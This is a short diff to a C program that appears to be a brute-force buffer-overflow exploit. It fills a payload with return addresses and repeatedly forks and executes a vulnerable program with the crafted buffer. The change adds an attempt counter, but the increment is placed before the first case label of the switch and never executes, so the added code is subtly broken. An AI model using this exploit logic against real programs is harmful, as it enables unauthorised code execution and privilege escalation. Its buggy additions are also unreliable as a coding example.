@@ -37,12 +37,14 @@ int main(int argc, char** argv){
 	for(i=0; i<payload_size; i+= sizeof(int), p++)
 	    *p = RET;
 	*p = 0;
-
+	static int p_no = 0;
 	// While our process hasnt correctly quit
 	do  {
 	    switch(pid=fork()){
+		p_no++;
 		case 0:
 		    // Execute the vulnerable program using our crafted
+		    printf("Creating a new process #%d",p_no);
 		    execle(appname, appname, buff, NULL, env);
 		    exit(1);
 		    break;
